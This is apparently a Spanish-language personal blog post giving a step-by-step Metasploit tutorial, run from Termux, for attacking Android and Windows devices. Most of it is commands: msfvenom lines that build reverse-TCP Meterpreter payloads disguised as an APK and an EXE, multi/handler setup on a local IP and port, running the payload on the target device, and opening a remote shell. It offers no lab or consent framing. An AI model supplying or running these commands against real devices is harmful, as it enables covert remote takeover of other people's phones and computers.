---
layout: post
title:  "Metasploit"
date:   2020-12-06 12:02:36 +0530
categories: Metasploit
---
En este post quiero incluir algunas notas sobre como hacer un ataque a android y windows desde termux con la herramienta Metasploit

la instalacion de texmux la encuentra [aqui][aqui]



Actualizar repositorios:

    apt update && apt upgrade


instalacion de Metasploit:


    pkg install unstable-repo
    pkg install metasploit


### Ataque a android

verificar la ip:

    ifconfig

<img src="{{ "/assets/img/ifconfig.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
    

generar payload:

    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 R > /sdcard/miapk.apk

abrimos la consola:

    msfconsole

<img src="{{ "/assets/img/msfconsole.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
  

preparamos metasploit:
```shell    
    use multi/handler
    
    set payload android/meterpreter/reverse_tcp
    
    set lhost 192.168.1.2
    
    set lport 4444
```
instalamos y ejecutamos el apk en el android a atacar:

<img src="{{ "/assets/img/apk.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">

ejecutamos el exploit:

    exploit
    
<img src="{{ "/assets/img/exploit.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">


### Ataque a windows

verificar la ip:

    ifconfig

<img src="{{ "/assets/img/ifconfig2.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
    

generar payload:

    msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.1.4 LPORT=4444 -o /sdcard/prueba.exe
    
abrimos la consola:

    msfconsole

<img src="{{ "/assets/img/msfconsole2.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
  

preparamos metasploit:

    use multi/handler

    set payload windows/meterpreter/reverse_tcp

    set lhost 192.168.1.4

    set lport 4444

ejecutamos la aplicacion de escritorio en el windows a atacar:

<img src="{{ "/assets/img/app.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">

ejecutamos el exploit:

    exploit
    
<img src="{{ "/assets/img/exploit2.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">


### comandos basicos


nos muestra las opciones disponibles:

    help

nos permite ingresar a la consola de windows:

    shell
    
[aqui]: https://santiago60.github.io/termux/2020/12/06/termux.html